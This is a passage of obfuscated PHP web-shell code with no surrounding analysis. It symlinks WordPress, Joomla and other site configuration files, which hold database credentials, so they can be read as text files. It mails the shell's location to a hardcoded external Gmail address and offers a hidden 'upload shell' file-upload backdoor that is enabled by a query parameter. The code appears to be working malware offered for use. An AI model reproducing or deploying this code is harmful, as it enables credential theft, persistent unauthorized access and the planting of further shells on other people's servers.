        symlink('/var/www/configuration.php', 'JOOMLA.txt');
        symlink('/var/www/config.inc.php', 'OPENJOURNAL.txt');
        symlink('/var/www/config.php', 'OTHER.txt');
        symlink('/var/www/config/koneksi.php', 'OTHER.txt');
        symlink('/var/www/include/config.php', 'OTHER.txt');
        symlink('/var/www/connect.php', 'OTHER.txt');
        symlink('/var/www/config/connect.php', 'OTHER.txt');
        symlink('/var/www/include/connect.php', 'OTHER.txt');
        symlink('/var/www/html/wp-config.php', 'WORDPRESS.txt');
        symlink('/var/www/html/configuration.php', 'JOOMLA.txt');
        symlink('/var/www/html/config.inc.php', 'OPENJOURNAL.txt');
        symlink('/var/www/html/config.php', 'OTHER.txt');
        symlink('/var/www/html/config/koneksi.php', 'OTHER.txt');
        symlink('/var/www/html/include/config.php', 'OTHER.txt');
        symlink('/var/www/html/connect.php', 'OTHER.txt');
        symlink('/var/www/html/config/connect.php', 'OTHER.txt');
        symlink('/var/www/html/include/connect.php', 'OTHER.txt');
    }
    echo '<i><b><a href=' . $IIIIIIIIII11 . '>cek Disini goblok!!!</a></b></i></center>';
};
echo '</td></table></body></html>
';
$IIIIIIIIIl11 = getenv('REMOTE_ADDR');
$IIIIIIIII1II = gethostbyaddr($IIIIIIIIIl11);
$IIIIIIIII1Il = 'Link : http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . '
';
$IIIIIIIII1I1 = 'malaysia.sender@gmail.com';
$IIIIIIIII1lI = 'from symlink script';
$IIIIIIIII1ll = 'From: privat';
$IIIIIIIII1ll.= $_POST['eMailAdd'] . '
';
$IIIIIIIII1ll.= 'MIME-Version: 1.0
';
$IIIIIIIII1l1 = array($IIIIIIIII1I1, $IIIIIIIII11I);
foreach ($IIIIIIIII1l1 as $IIIIIIIII1I1) mail($IIIIIIIII1I1, $IIIIIIIII1lI, $IIIIIIIII1Il, $IIIIIIIII1ll, $IIIIIIIII11l);;
echo '';
$young = $_GET['UBK'];
if ($young == '3') {
    $IIIIIIIIlIII = $_FILES['file']['name'];
    $IIIIIIIIlIIl = $_FILES['file']['tmp_name'];
    echo "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='upload shell' />
</form>";
    move_uploaded_file($IIIIIIIIlIIl, $IIIIIIIIlIII);
};
